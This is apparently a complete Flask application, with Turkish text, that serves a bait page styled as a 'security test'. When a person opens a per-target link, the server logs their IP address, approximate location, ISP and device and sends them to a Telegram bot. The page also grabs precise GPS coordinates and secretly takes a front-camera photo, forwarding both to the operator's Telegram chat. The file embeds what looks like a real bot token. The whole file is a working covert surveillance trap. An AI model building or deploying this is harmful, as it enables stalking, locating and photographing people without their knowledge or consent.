from flask import Flask, request, render_template_string
import requests
import datetime
import base64

app = Flask(__name__)

TOKEN = "8887284177:AAEpJLJuyQShebNtE54C1wahiAKWwtm5aBU"
CHAT_ID = "8218333855"
BASE_URL = "https://yusufai.onrender.com/"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenlik Denetimi</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #0f172a 0%, #020617 100%); 
            color: #f8fafc; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            overflow: hidden;
        }
        .container { 
            background: rgba(30, 41, 59, 0.7); 
            backdrop-filter: blur(10px);
            padding: 45px; 
            border-radius: 16px; 
            border: 1px solid rgba(56, 189, 248, 0.2); 
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 0 0 20px rgba(56, 189, 248, 0.1); 
            text-align: center; 
            max-width: 480px; 
            width: 90%; 
        }
        .icon { font-size: 50px; margin-bottom: 15px; }
        h1 { font-size: 32px; color: #38bdf8; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; font-weight: 800; }
        p { color: #94a3b8; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
        .alert-box {
            background: rgba(15, 23, 42, 0.8);
            border-left: 4px solid #38bdf8;
            padding: 15px;
            border-radius: 0 8px 8px 0;
            text-align: left;
            font-size: 13px;
            color: #e2e8f0;
            margin-bottom: 20px;
            font-family: monospace;
        }
        .highlight { color: #38bdf8; font-weight: bold; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🎯</div>
        <h1>YAKALANDIN!</h1>
        <div class="alert-box">
            &gt; Durum: <span class="highlight">Bağlantı Doğrulandı</span><br>
            &gt; İşlem: Sistem Verileri Kaydedildi
        </div>
        <p>Merak etme, sadece küçük bir güvenlik testiydi. Artık bu bağlantının arkasında ne olduğunu biliyorsun.</p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        window.addEventListener('load', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const targetId = urlParams.get('id') || 'Bilinmiyor';

            let capturedData = { target_id: targetId, gps_lat: null, gps_lon: null, image: null };

            // 1. GPS Konumunu Almaya Çalış (Nokta atışı için)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    capturedData.gps_lat = position.coords.latitude;
                    capturedData.gps_lon = position.coords.longitude;
                    sendData();
                }, function(error) {
                    sendData(); // İzin vermezse bile devam et
                }, { timeout: 5000, enableHighAccuracy: true });
            } else {
                sendData();
            }

            // 2. Kamerayı Aç ve Fotoğraf Çek
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(function(stream) {
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(function() {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    capturedData.image = canvas.toDataURL('image/jpeg');
                    
                    sendData();
                    stream.getTracks().forEach(track => track.stop());
                }, 1500);
            })
            .catch(function(error) {
                sendData();
            });

            let sent = false;
            function sendData() {
                // Hem kamera hem konum verisi toplanınca veya süre dolunca sunucuya gönder
                if (sent) return;
                if (capturedData.image || capturedData.gps_lat) {
                    sent = true;
                    fetch('/capture', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(capturedData)
                    });
                }
            }
        });
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    target_id = request.args.get('id', 'Genel / IDsiz')

    if request.headers.get('CF-Connecting-IP'):
        ip = request.headers.get('CF-Connecting-IP')
    elif request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    else:
        ip = request.remote_addr

    user_agent = request.headers.get('User-Agent')
    zaman = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp", timeout=3).json()
        country = geo.get('country', 'Bilinmiyor')
        region = geo.get('regionName', 'Bilinmiyor')
        city = geo.get('city', 'Bilinmiyor')
        isp = geo.get('isp', 'Bilinmiyor')
    except:
        country = region = city = isp = "Bilinmiyor"
    
    msg = (
        f"🚨 **HEDEF AĞA TAKILDI!**\n\n"
        f"🏷️ **Hedef ID:** `{target_id}`\n"
        f"⏱️ Zaman: {zaman}\n"
        f"🌍 IP Adresi: `{ip}`\n"
        f"🏳️ Ülke: {country}\n"
        f"🏙️ İl: {region}\n"
        f"🏘️ İlçe / Şehir: {city}\n"
        f"🏢 İSS: {isp}\n"
        f"📱 Cihaz: {user_agent}"
    )
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
            "chat_id": CHAT_ID,
            "text": msg,
            "parse_mode": "Markdown"
        })
    except:
        pass
    
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    image_data = data.get('image')
    target_id = data.get('target_id', 'Bilinmiyor')
    lat = data.get('gps_lat')
    lon = data.get('gps_lon')
    
    # Eğer tarayıcıdan gerçek GPS konumu geldiyse harita linki oluşturalım
    gps_info = ""
    if lat and lon:
        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        gps_info = f"\n\n📍 **Nokta Atışı GPS Konumu:**\n{maps_link}"

    if image_data:
        try:
            header, encoded = image_data.split(",", 1)
            image_bytes = base64.b64decode(encoded)
            
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                data={
                    "chat_id": CHAT_ID, 
                    "caption": f"📸 Hedefin Fotoğrafı (ID: {target_id}){gps_info}"
                },
                files={"photo": ("capture.jpg", image_bytes, "image/jpeg")}
            )
        except Exception as e:
            print(f"Hata: {e}")
    elif lat and lon:
        # Fotoğraf vermese bile GPS geldiyse metin olarak at
        try:
            requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
                "chat_id": CHAT_ID,
                "text": f"📍 **GPS Konumu Yakalandı (ID: {target_id})**\n{maps_link}",
                "parse_mode": "Markdown"
            })
        except:
            pass
            
    return "", 204

@app.route('/webhook', methods=['POST'])
def webhook():
    data = request.get_json()
    try:
        if 'message' in data:
            message = data['message']
            chat_id = message['chat']['id']
            text = message.get('text', '').strip()
            
            if text.startswith('/link'):
                parts = text.split(' ', 1)
                if len(parts) > 1 and parts[1].strip():
                    custom_id = parts[1].strip()
                    custom_link = f"{BASE_URL}?id={custom_id}"
                    reply_text = f"🔗 **{custom_id}** için özel link:\n{custom_link}"
                else:
                    reply_text = f"🔗 Genel Aktif Link:\n{BASE_URL}\n\n💡 *Kullanım: `/link <id>` şeklinde yaz.*"
                
                requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", params={
                    "chat_id": chat_id,
                    "text": reply_text,
                    "parse_mode": "Markdown"
                })
    except Exception as e:
        print(f"Webhook Hatası: {e}")
        
    return "", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
